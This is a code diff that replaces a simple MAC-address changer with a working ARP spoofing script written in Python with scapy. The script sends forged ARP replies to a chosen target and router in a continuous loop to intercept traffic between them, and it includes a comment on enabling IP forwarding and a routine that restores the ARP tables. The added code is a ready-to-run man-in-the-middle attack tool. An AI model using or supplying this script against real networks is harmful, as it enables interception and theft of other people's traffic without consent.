@@ -1,51 +1,53 @@
+import scapy.all as scapy
+import time
+import itertools
 import subprocess
 import optparse
-import re
 
-#parse the args user returns return interface & mac
-def arg_parser():
-    parser = optparse.OptionParser() 
-    parser.add_option("-i", "--interface", dest="interface", help="Interface whose MAC to change" )
-    parser.add_option("-m", "--mac", dest="mac_address", help="New MAC address")
+def arg_parse():
+    parser = optparse.OptionParser()
+    parser.add_option("-t", "--target", dest="target", help="Targets IP Address")
+    parser.add_option("-r", "--router", dest="router", help="Routers IP Address")
     (options, arguments) = parser.parse_args()
-    if not options.interface:
-        print("[-] Please specify interface, use --help for more info")
-    elif not options.mac_address:
-        print("[-] Please specify mac_address, use --help for more info") 
+    if not options.target:
+        print("[-] Please specify targets IP, use --help for more info")
+    elif not options.router:
+        print("[-] Please specify routers IP, use --help for more info") 
     return options
 
-#get the current mac address
-def get_mac(interface):
-     ifconfig_result = subprocess.check_output(["ifconfig", interface])
-     mac_address_search = re.search(r'\w\w:\w\w:\w\w:\w\w:\w\w:\w\w', str(ifconfig_result))
-     if mac_address_search:
-         return mac_address_search.group(0)
-     else:
-         print("[-] Could not read MAC address")
-         
-    
-     
-#change current mac of specified interface
-def mac_change(interface, mac_address):
-    #user message
-    print(f"[+] Changing MAC Address for {interface} to {mac_address}")
-    #change MAC of interface
-    subprocess.call(["ifconfig",interface,"down"])
-    subprocess.call(["ifconfig",interface,"hw","ether",mac_address])
-    subprocess.call(["ifconfig",interface,"up"])
-    
-def check_mac_change(current_mac, new_mac):
-    if current_mac == new_mac:
-        print("[+] MAC address successfully changed.")
-    else:
-        print("[-] Failed to change MAC address")
-        
+def get_hw(ip):
+    tcp_request = scapy.ARP(pdst=ip)
+    broadast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broad = broadast/tcp_request
+    ans = scapy.srp(arp_request_broad, timeout=1, verbose=False)[0]
+    return ans[0][1].hwsrc
 
-if __name__ == '__main__':
-   
-    #call function 
-    options = arg_parser()
-    mac_change(options.interface, options.mac_address)
-    current_mac = get_mac(options.interface)
-    check_mac_change(current_mac, options.mac_address)
-   
+def spf(t_ip, spf_ip):
+    target_hw=get_hw(t_ip)
+    packet = scapy.ARP(op=2, pdst=t_ip, hwdst=target_hw, psrc=spf_ip) 
+    scapy.send(packet, verbose=False)
+
+
+def restore(ip_t, ip_src):
+    mac = get_hw(ip_t)
+    src_mac = get_hw(ip_src)
+    packet = scapy.ARP(op=2, pdst=ip_t, hwdst=mac, psrc=ip_src, hwsrc=src_mac)
+    scapy.send(packet, count=4, verbose=False
+               )
+#allow ip forwarding: echo 1 >/proc/sys/net/ipv4/ip_forward
+if __name__ == "__main__":
+    
+   options = arg_parse()
+   counter = lambda count=1: (num*2 for num in itertools.count(count))
+   count = counter()
+   if options.router and options.target != None:
+       try:
+           while True:
+               spf(options.target, options.router)
+               spf(options.router,options.target)
+               print(f"\r[+] Packets sent:{next(count)}", end="\r")
+               time.sleep(1.5)
+       except KeyboardInterrupt:
+           print("\n[-] Quitting...")  
+           restore(options.target, options.router)
+           restore(options.router, options.target )
